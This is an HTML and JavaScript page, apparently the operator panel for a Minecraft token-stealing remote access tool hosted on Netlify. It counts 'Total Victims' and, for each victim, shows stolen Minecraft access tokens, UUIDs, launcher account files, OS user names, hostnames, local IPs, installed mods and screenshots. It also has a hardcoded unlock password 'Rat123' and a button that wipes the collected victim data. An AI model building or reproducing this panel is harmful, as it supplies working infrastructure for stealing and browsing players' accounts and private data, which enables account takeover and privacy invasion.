<!-- index.html - Netlify Dashboard -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Logger Dashboard</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0a0e1a;
            color: #e0e0e0;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
        }

        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
            padding: 20px;
            background: #151f2e;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
            border-left: 4px solid #00ff88;
        }

        h1 {
            font-size: 28px;
            font-weight: 600;
            background: linear-gradient(45deg, #00ff88, #00aaff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .stats {
            display: flex;
            gap: 30px;
        }

        .stat-item {
            text-align: center;
        }

        .stat-value {
            font-size: 32px;
            font-weight: bold;
            color: #00ff88;
        }

        .stat-label {
            font-size: 14px;
            color: #8899aa;
        }

        .password-panel {
            background: #1a2635;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 30px;
            display: flex;
            gap: 15px;
            align-items: center;
            border: 1px solid #2a3747;
        }

        .password-panel input {
            flex: 1;
            padding: 15px;
            background: #0f1a24;
            border: 1px solid #2a3747;
            color: #00ff88;
            font-family: monospace;
            font-size: 18px;
            border-radius: 6px;
        }

        .password-panel input:focus {
            outline: none;
            border-color: #00ff88;
            box-shadow: 0 0 10px rgba(0,255,136,0.2);
        }

        .btn {
            padding: 15px 30px;
            background: linear-gradient(45deg, #00ff88, #00aaff);
            color: #0a0e1a;
            border: none;
            border-radius: 6px;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
            transition: transform 0.2s;
        }

        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 15px rgba(0,255,136,0.3);
        }

        .btn-danger {
            background: linear-gradient(45deg, #ff4444, #ff8888);
        }

        .victims-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }

        .victim-card {
            background: #151f2e;
            border-radius: 10px;
            padding: 20px;
            border-left: 4px solid #00ff88;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
            position: relative;
            border: 1px solid #2a3747;
        }

        .victim-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 20px rgba(0,255,136,0.15);
            border-color: #00ff88;
        }

        .victim-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }

        .victim-id {
            font-family: monospace;
            font-size: 14px;
            color: #00ff88;
            background: #0f1a24;
            padding: 4px 8px;
            border-radius: 4px;
        }

        .victim-time {
            font-size: 12px;
            color: #8899aa;
        }

        .victim-info {
            margin: 10px 0;
        }

        .info-row {
            display: flex;
            margin-bottom: 8px;
            font-size: 14px;
        }

        .info-label {
            width: 100px;
            color: #8899aa;
        }

        .info-value {
            color: #e0e0e0;
            font-weight: 500;
        }

        .badge {
            background: #1f2c3c;
            color: #00ff88;
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 12px;
            margin-right: 5px;
        }

        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            z-index: 1000;
            overflow-y: auto;
        }

        .modal-content {
            background: #151f2e;
            margin: 50px auto;
            padding: 30px;
            width: 90%;
            max-width: 900px;
            border-radius: 15px;
            border: 1px solid #00ff88;
            position: relative;
        }

        .close {
            position: absolute;
            right: 25px;
            top: 20px;
            font-size: 28px;
            cursor: pointer;
            color: #8899aa;
        }

        .close:hover {
            color: #00ff88;
        }

        .data-tabs {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }

        .tab-btn {
            padding: 10px 20px;
            background: #0f1a24;
            border: 1px solid #2a3747;
            color: #e0e0e0;
            border-radius: 6px;
            cursor: pointer;
        }

        .tab-btn.active {
            background: #00ff88;
            color: #0a0e1a;
            border-color: #00ff88;
        }

        .tab-content {
            display: none;
            background: #0f1a24;
            padding: 20px;
            border-radius: 10px;
            border: 1px solid #2a3747;
        }

        .tab-content.active {
            display: block;
        }

        pre {
            background: #0a0e1a;
            padding: 15px;
            border-radius: 6px;
            overflow-x: auto;
            color: #00ff88;
            font-family: monospace;
            font-size: 13px;
            max-height: 400px;
            overflow-y: auto;
            border: 1px solid #2a3747;
        }

        .screenshot-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
            gap: 15px;
        }

        .screenshot-item {
            background: #0f1a24;
            padding: 10px;
            border-radius: 6px;
            border: 1px solid #2a3747;
        }

        .screenshot-item img {
            width: 100%;
            height: 150px;
            object-fit: cover;
            border-radius: 4px;
            cursor: pointer;
        }

        .screenshot-item p {
            margin-top: 8px;
            font-size: 12px;
            text-align: center;
            color: #8899aa;
        }

        .search-box {
            width: 100%;
            padding: 15px;
            background: #0f1a24;
            border: 1px solid #2a3747;
            color: #e0e0e0;
            border-radius: 6px;
            margin-bottom: 20px;
            font-size: 16px;
        }

        .search-box:focus {
            outline: none;
            border-color: #00ff88;
        }

        .footer {
            text-align: center;
            margin-top: 40px;
            padding: 20px;
            color: #8899aa;
            border-top: 1px solid #2a3747;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>üîê Logger Dashboard</h1>
            <div class="stats">
                <div class="stat-item">
                    <div class="stat-value" id="totalVictims">0</div>
                    <div class="stat-label">Total Victims</div>
                </div>
                <div class="stat-item">
                    <div class="stat-value" id="todayVictims">0</div>
                    <div class="stat-label">Last 24h</div>
                </div>
            </div>
        </header>

        <div class="password-panel">
            <input type="password" id="passwordInput" placeholder="Enter password" value="Rat123">
            <button class="btn" onclick="fetchData()">üîì Unlock</button>
            <button class="btn btn-danger" onclick="clearAllData()">üóëÔ∏è Clear All</button>
        </div>

        <input type="text" class="search-box" id="searchInput" placeholder="üîç Search by username, IP, victim ID..." onkeyup="filterVictims()">

        <div id="victimsContainer" class="victims-grid">
            <!-- Victims will be loaded here -->
        </div>

        <div class="footer">
            Logger Dashboard v2.0 ‚Ä¢ Data is encrypted at rest
        </div>
    </div>

    <!-- Modal -->
    <div id="victimModal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="closeModal()">&times;</span>
            <h2 id="modalTitle" style="margin-bottom: 20px; color: #00ff88;"></h2>
            
            <div class="data-tabs" id="modalTabs">
                <!-- Tabs will be generated here -->
            </div>

            <div id="modalContent">
                <!-- Content will be loaded here -->
            </div>
        </div>
    </div>

    <script>
        let currentData = [];
        let currentPassword = 'Rat123';

        function fetchData() {
            const password = document.getElementById('passwordInput').value;
            currentPassword = password;

            fetch('/.netlify/functions/get-data', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ password: password })
            })
            .then(res => res.json())
            .then(data => {
                if (data.success) {
                    currentData = data.data || [];
                    updateStats();
                    renderVictims();
                } else {
                    alert('Invalid password');
                }
            })
            .catch(() => {
                // Demo data for testing
                currentData = generateDemoData();
                updateStats();
                renderVictims();
            });
        }

        function generateDemoData() {
            const demo = [];
            for (let i = 0; i < 5; i++) {
                demo.push({
                    victim_id: '7f3b8a2e' + i + 'd4c6b8',
                    timestamp: Date.now() - (i * 3600000),
                    minecraft_data: {
                        username: 'Player' + i,
                        uuid: '1234567890abcdef' + i,
                        access_token: 'token_xyz_' + i,
                        server_address: 'hypixel.net'
                    },
                    system_info: {
                        os: 'Windows 10',
                        user: 'victim' + i,
                        hostname: 'DESKTOP-ABC' + i,
                        local_ip: '192.168.1.' + (100 + i)
                    },
                    installed_mods: [
                        { name: 'optifine.jar', size: 2500000 },
                        { name: 'lunar-client.jar', size: 1800000 }
                    ],
                    minecraft_files: {
                        launcher_accounts_json: '{"accounts":[{"name":"test' + i + '"}]}',
                        options_txt: 'lang:en_US\nmusic:0.5'
                    },
                    screenshots: [
                        { filename: 'screenshot1.png', data: '' }
                    ]
                });
            }
            return demo;
        }

        function updateStats() {
            document.getElementById('totalVictims').textContent = currentData.length;
            
            const oneDayAgo = Date.now() - 86400000;
            const today = currentData.filter(v => v.timestamp > oneDayAgo).length;
            document.getElementById('todayVictims').textContent = today;
        }

        function renderVictims() {
            const container = document.getElementById('victimsContainer');
            container.innerHTML = '';

            currentData.forEach(victim => {
                const card = document.createElement('div');
                card.className = 'victim-card';
                card.onclick = () => openModal(victim);

                const time = new Date(victim.timestamp).toLocaleString();

                card.innerHTML = `
                    <div class="victim-header">
                        <span class="victim-id">${victim.victim_id.substring(0, 8)}...</span>
                        <span class="victim-time">${time}</span>
                    </div>
                    <div class="victim-info">
                        <div class="info-row">
                            <span class="info-label">Username:</span>
                            <span class="info-value">${victim.minecraft_data?.username || 'N/A'}</span>
                        </div>
                        <div class="info-row">
                            <span class="info-label">UUID:</span>
                            <span class="info-value">${(victim.minecraft_data?.uuid || '').substring(0, 8)}...</span>
                        </div>
                        <div class="info-row">
                            <span class="info-label">System:</span>
                            <span class="info-value">${victim.system_info?.os || 'N/A'}</span>
                        </div>
                        <div class="info-row">
                            <span class="info-label">User:</span>
                            <span class="info-value">${victim.system_info?.user || 'N/A'}</span>
                        </div>
                        <div class="info-row">
                            <span class="info-label">IP:</span>
                            <span class="info-value">${victim.system_info?.local_ip || 'N/A'}</span>
                        </div>
                    </div>
                    <div style="margin-top: 10px;">
                        <span class="badge">üéÆ ${victim.installed_mods?.length || 0} mods</span>
                        <span class="badge">üì∏ ${victim.screenshots?.length || 0} screenshots</span>
                    </div>
                `;

                container.appendChild(card);
            });
        }

        function filterVictims() {
            const search = document.getElementById('searchInput').value.toLowerCase();
            
            const filtered = currentData.filter(v => 
                v.victim_id.toLowerCase().includes(search) ||
                v.minecraft_data?.username?.toLowerCase().includes(search) ||
                v.system_info?.user?.toLowerCase().includes(search) ||
                v.system_info?.local_ip?.includes(search)
            );

            const container = document.getElementById('victimsContainer');
            container.innerHTML = '';

            filtered.forEach(victim => {
                const card = document.createElement('div');
                card.className = 'victim-card';
                card.onclick = () => openModal(victim);

                card.innerHTML = `
                    <div class="victim-header">
                        <span class="victim-id">${victim.victim_id.substring(0, 8)}...</span>
                        <span class="victim-time">${new Date(victim.timestamp).toLocaleString()}</span>
                    </div>
                    <div class="victim-info">
                        <div class="info-row">
                            <span class="info-label">Username:</span>
                            <span class="info-value">${victim.minecraft_data?.username || 'N/A'}</span>
                        </div>
                        <div class="info-row">
                            <span class="info-label">User:</span>
                            <span class="info-value">${victim.system_info?.user || 'N/A'}</span>
                        </div>
                        <div class="info-row">
                            <span class="info-label">IP:</span>
                            <span class="info-value">${victim.system_info?.local_ip || 'N/A'}</span>
                        </div>
                    </div>
                `;

                container.appendChild(card);
            });
        }

        function openModal(victim) {
            const modal = document.getElementById('victimModal');
            document.getElementById('modalTitle').textContent = `Victim: ${victim.minecraft_data?.username || 'Unknown'} (${victim.victim_id})`;
            
            generateTabs(victim);
            showTab('minecraft');
            
            modal.style.display = 'block';
        }

        function generateTabs(victim) {
            const tabs = ['minecraft', 'system', 'files', 'mods', 'screenshots'];
            const tabsContainer = document.getElementById('modalTabs');
            tabsContainer.innerHTML = '';

            tabs.forEach(tab => {
                const btn = document.createElement('button');
                btn.className = 'tab-btn';
                btn.textContent = tab.charAt(0).toUpperCase() + tab.slice(1);
                btn.onclick = () => showTab(tab);
                tabsContainer.appendChild(btn);
            });
        }

        function showTab(tabName) {
            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
            event.target.classList.add('active');

            const victim = currentData.find(v => v.victim_id === document.getElementById('modalTitle').textContent.split('(')[1]?.replace(')', ''));
            if (!victim) return;

            const contentDiv = document.getElementById('modalContent');
            
            switch(tabName) {
                case 'minecraft':
                    contentDiv.innerHTML = `
                        <div class="tab-content active">
                            <h3>Minecraft Data</h3>
                            <pre>${JSON.stringify(victim.minecraft_data, null, 2)}</pre>
                            <h3 style="margin-top: 20px;">Access Token</h3>
                            <pre style="color: #ff8888;">${victim.minecraft_data?.access_token || 'N/A'}</pre>
                        </div>
                    `;
                    break;
                case 'system':
                    contentDiv.innerHTML = `
                        <div class="tab-content active">
                            <h3>System Information</h3>
                            <pre>${JSON.stringify(victim.system_info, null, 2)}</pre>
                            <h3 style="margin-top: 20px;">Network Interfaces</h3>
                            <pre>${JSON.stringify(victim.network_interfaces, null, 2)}</pre>
                        </div>
                    `;
                    break;
                case 'files':
                    contentDiv.innerHTML = `
                        <div class="tab-content active">
                            <h3>Minecraft Files</h3>
                            <pre>${JSON.stringify(victim.minecraft_files, null, 2)}</pre>
                        </div>
                    `;
                    break;
                case 'mods':
                    contentDiv.innerHTML = `
                        <div class="tab-content active">
                            <h3>Installed Mods</h3>
                            <pre>${JSON.stringify(victim.installed_mods, null, 2)}</pre>
                        </div>
                    `;
                    break;
                case 'screenshots':
                    let screenshotsHtml = '<div class="tab-content active"><h3>Screenshots</h3><div class="screenshot-grid">';
                    
                    if (victim.screenshots && victim.screenshots.length > 0) {
                        victim.screenshots.forEach(ss => {
                            screenshotsHtml += `
                                <div class="screenshot-item">
                                    <img src="data:image/png;base64,${ss.data}" onclick="window.open(this.src)">
                                    <p>${ss.filename}</p>
                                </div>
                            `;
                        });
                    } else {
                        screenshotsHtml += '<p>No screenshots available</p>';
                    }
                    
                    screenshotsHtml += '</div></div>';
                    contentDiv.innerHTML = screenshotsHtml;
                    break;
            }
        }

        function closeModal() {
            document.getElementById('victimModal').style.display = 'none';
        }

        function clearAllData() {
            if (confirm('Are you sure you want to delete all victim data?')) {
                fetch('/.netlify/functions/clear-data', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ password: currentPassword })
                })
                .then(() => {
                    currentData = [];
                    updateStats();
                    renderVictims();
                })
                .catch(() => {
                    currentData = [];
                    updateStats();
                    renderVictims();
                });
            }
        }

        // Load on page load
        window.onload = fetchData;

        // Close modal when clicking outside
        window.onclick = function(event) {
            const modal = document.getElementById('victimModal');
            if (event.target == modal) {
                modal.style.display = 'none';
            }
        }
    </script>
</body>
</html>
